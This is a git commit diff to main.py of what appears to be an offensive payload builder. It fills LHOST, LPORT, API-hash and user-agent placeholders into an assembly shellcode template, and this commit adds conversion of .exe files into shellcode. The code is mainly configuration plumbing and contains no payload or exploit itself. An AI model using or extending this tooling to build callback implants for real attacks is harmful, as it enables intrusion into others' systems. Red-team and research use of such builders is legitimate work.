ef8b5633029dc4bad1b9ac2fe679476b822dc3de
Kyrd0x <remi@couzi.fr>
2025-02-27 16:55:32 +0100

    ongoing packing functionnalities

--- main.py
+++ main.py
@@ -3,6 +3,7 @@ from scripts.ROR import hash
 from scripts.config import parse_config
 from scripts.utils import *
 import random
+import sys
 
 config = ConfigParser()
 config.read(".conf") 
@@ -11,7 +12,7 @@ config.read(".conf")
 
 ROR_VALUE = config.getint("Payload", "ror_value")
 ENCRYPTION_KEY = config.get("Payload", "encryption_key")
-PAYLOAD_FILE = config.get("Payload", "filename")
+PAYLOAD_FILE = config.get("Payload", "file")
 
 # MODE = config.get("Payload","mode")
 LHOST = config.get("Payload", "lhost")
@@ -30,14 +31,15 @@ def main():
     print("===========================\n")
 
     print("===========PAYLOAD==============")
-    sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%ROR_VALUE%", hex(ROR_VALUE))
-    
-    sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%LPORT%", hex(LPORT))
-    sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%LHOST%", LHOST.replace('"',''))
-    sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%USER-AGENT%", USER_AGENT.replace('"',''))
+    if PAYLOAD_FILE.endswith(".nasm") or PAYLOAD_FILE.endswith(".asm"):
+        sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%ROR_VALUE%", hex(ROR_VALUE))
+        
+        sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%LPORT%", hex(LPORT))
+        sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%LHOST%", LHOST.replace('"',''))
+        sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%USER-AGENT%", USER_AGENT.replace('"',''))
 
-    if LHOST.count(".") == 3:
-        sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%LHOST__LPORT%", format_lhost_lport(LHOST,LPORT))
+        if LHOST.count(".") == 3:
+            sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%LHOST__LPORT%", format_lhost_lport(LHOST,LPORT))
 
     all_tags = extract_tags_from_folder(WORKING_FOLDER)
 
@@ -62,8 +64,17 @@ def main():
 
     # Tags like %HASH__MODULE__FUNCTION% are replaced by their hash
 
+    if PAYLOAD_FILE.endswith(".nasm") or PAYLOAD_FILE.endswith(".asm"):
+        instructions = nasm2instructions(WORKING_FOLDER+PAYLOAD_FILE)
 
-    instructions = nasm2instructions(WORKING_FOLDER+PAYLOAD_FILE)
+
+
+
+    elif PAYLOAD_FILE.endswith(".exe"):
+        instructions = pe2instructions(WORKING_FOLDER+PAYLOAD_FILE)
+    else:
+        print("Unknown file format of the payload")
+        sys.exit(1)
     nb_bytes = int(len(instructions)/2)
     print(f"Shellcode length: {nb_bytes} bytes")
     print("================================\n")
